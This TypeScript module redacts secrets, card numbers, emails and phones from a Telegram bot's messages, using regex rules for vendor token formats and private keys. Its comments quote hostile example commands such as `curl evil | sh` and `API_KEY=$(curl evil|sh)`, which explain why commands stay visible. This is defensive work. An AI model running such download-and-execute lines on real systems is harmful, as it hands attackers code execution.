import { tr } from '../i18n.ts'

// What leaves for Telegram is masked by default: emails, phone numbers, card numbers, keys, tokens and
// passwords. Telegram keeps every message, and a stolen phone or session would show them all. Claude still
// works with the real values; only the copy the user reads is masked. The real text comes only through the
// “Show for a minute” button, as a copy the bot deletes after a minute
type Rule = { name: string, re: RegExp, mask: (m: string, ...g: string[]) => string }

const keep = (s: string, head: number, tail = 0) =>
  s.length <= head + tail + 3 ? '•••' : `${s.slice(0, head)}•••${tail ? s.slice(-tail) : ''}`

// A card number is only one when the Luhn check passes: order ids and timestamps stay as they are
function luhn(digits: string) {
  let sum = 0
  for (let i = 0; i < digits.length; i++) {
    let d = Number(digits[digits.length - 1 - i])
    if (i % 2) d = d * 2 > 9 ? d * 2 - 9 : d * 2
    sum += d
  }
  return sum % 10 === 0
}

// The last ones are this product's own: a computer's key, the cloud's, the backups', the code that claims the bot
const SECRET_NAMES = 'password|passwd|pwd|passphrase|[_-]pass\\b|secret|token|api[_-]?key|access[_-]?key|private[_-]?key|client[_-]?secret|signing[_-]?key|encryption[_-]?key|device[_-]?keys?|cloud[_-]?key|backup[_-]?key|tgcv-key|claim[_-]?code'
// Shell that runs something, as opposed to a value
const RUNS_SOMETHING = /^\$|\$\(|`|\|/

// A key is lines of base64, real or written \n in a string, and a few header lines. Only that is taken: whatever else
// follows a BEGIN line stays readable, or `echo "-----BEGIN PRIVATE KEY-----"; curl evil | sh` is a card that shows nothing.
// A key cut off by its end still goes, and so does one where the output was cut in the middle
const KEY_EOL = String.raw`(?:(?:\\r)?\\n|\r?\n)`
const KEY_LINE = String.raw`(?:[A-Za-z0-9+/=]+|(?:Proc-Type|DEK-Info|Comment|Version):[^\n\\]*|…\[output truncated\]…)(?=[ \t]*(?:${KEY_EOL}|["']|$))`
const PRIVATE_KEY = new RegExp(String.raw`-----BEGIN [A-Z ]*PRIVATE KEY-----(?:${KEY_EOL}[ \t]*(?:${KEY_LINE})?)*(?:[ \t]+[A-Za-z0-9+/=]{40,})*(?:\s*-----END [A-Z ]*PRIVATE KEY-----)?`, 'g')

const RULES: Rule[] = [
  { name: 'private key', re: PRIVATE_KEY, mask: () => tr('[private key hidden]', '[скрыт приватный ключ]') },
  // Known key and token formats: Anthropic, OpenAI, GitHub, Slack, AWS, Google, Stripe, Telegram bot tokens, JWT
  { name: 'key', re: /\b(?:sk-ant-[\w-]{20,}|sk-(?:proj-)?[\w-]{20,}|gh[pousr]_[A-Za-z0-9]{30,}|github_pat_\w{30,}|xox[abprs]-[\w-]{10,}|AKIA[0-9A-Z]{16}|AIza[\w-]{35}|[rs]k_(?:live|test)_[\w]{20,}|glpat-[\w-]{20,}|npm_[A-Za-z0-9]{30,}|hf_[A-Za-z0-9]{30,})\b/g, mask: m => `${m.slice(0, m.indexOf('_') > 0 && m.indexOf('_') < 12 ? m.indexOf('_') + 1 : 7)}•••` },
  // Often right after a word: api.telegram.org/bot123:ABC…/getMe
  { name: 'telegram token', re: /(?<!\d)\d{8,10}:[A-Za-z0-9_-]{35}(?![\w-])/g, mask: () => tr('[bot token hidden]', '[скрыт токен бота]') },
  { name: 'jwt', re: /\beyJ[\w-]{10,}\.eyJ[\w-]{10,}\.[\w-]{10,}\b/g, mask: () => tr('[token hidden]', '[скрыт токен]') },
  { name: 'bearer', re: /\b(Bearer)\s+[\w.~+/=-]{16,}/gi, mask: (_m, b) => `${b} •••` },
  { name: 'basic auth', re: /\b(Authorization:\s*Basic)\s+[\w+/=]{8,}/gi, mask: (_m, b) => `${b} •••` },
  // A quoted value may hold spaces. One with a command in it stays visible: a permission prompt must not hide what runs.
  // It ends at its own closing quote, whatever its length: token="a"; curl evil; x="y" has a value of one letter and a command
  {
    name: 'secret phrase',
    re: new RegExp(`\\b([\\w-]*(?:${SECRET_NAMES})[\\w-]*)(\\s*["']?\\s*[:=]\\s*)(["'])((?:\\\\"|(?!\\3)[^\\n]){4,}?)\\3`, 'gi'),
    mask: (m, name, sep, q, value) => (RUNS_SOMETHING.test(value) ? m : `${name}${sep}${q}•••${q}`),
  },
  // password=…, "api_key": "…", TOKEN: … — the value goes, the name stays readable
  {
    name: 'secret value',
    re: new RegExp(`\\b([\\w-]*(?:${SECRET_NAMES})[\\w-]*)(\\s*["']?\\s*[:=]\\s*["']?)([^\\s"',;]{4,})`, 'gi'),
    // API_KEY=$(curl evil|sh) npm run build must not read as API_KEY=••• npm run build
    mask: (m, name, sep, value) => (RUNS_SOMETHING.test(value) ? m : `${name}${sep}${value.replace(/^[^&|<>()`]+/, '•••')}`),
  },
  // user:password@host in connection strings
  { name: 'url password', re: /\b([a-z][a-z0-9+.-]*:\/\/[^\s:/@]+:)[^\s@/]+@/gi, mask: (_m, head) => `${head}•••@` },
  { name: 'email', re: /\b([A-Za-z0-9._%+-])[A-Za-z0-9._%+-]*@([A-Za-z0-9-])[A-Za-z0-9.-]*(\.[A-Za-z]{2,})\b/g, mask: (_m, a, b, tld) => `${a}•••@${b}•••${tld}` },
  {
    name: 'card',
    // Not a custom emoji's id, some of which pass the Luhn check too. Only the whole tag with its 19 digits: a number
    // anywhere after emoji-id=" would be a way past this rule
    re: /(?<!<tg-emoji emoji-id="(?=\d{19}">))\b(?:\d[ -]?){12,18}\d\b/g,
    mask: m => {
      const digits = m.replace(/\D/g, '')
      return digits.length >= 13 && digits.length <= 19 && luhn(digits) ? `•••• ${digits.slice(-4)}` : m
    },
  },
  // International format only (+ and 10–15 digits): plain long numbers in code and logs stay
  { name: 'phone', re: /\+\d[\d ()-]{8,18}\d/g, mask: m => keep(m.replace(/[^\d+]/g, ''), 2, 2) },
]

// The unmasked copy shows only text: pictures and videos already arrived with the masked message
export const revealText = (md: string) => md.replace(/^!\[[^\]]*\]\(tg:\/\/[^)]*\)\s*$/gm, '').replace(/\n{3,}/g, '\n\n').trim()

export function redact(text: string): { text: string, found: string[] } {
  const found = new Set<string>()
  let out = text
  for (const r of RULES) {
    out = out.replace(r.re, (m, ...g) => {
      const masked = r.mask(m, ...(g.filter(x => typeof x === 'string') as string[]))
      if (masked !== m) found.add(r.name)
      return masked
    })
  }
  return { text: out, found: [...found] }
}
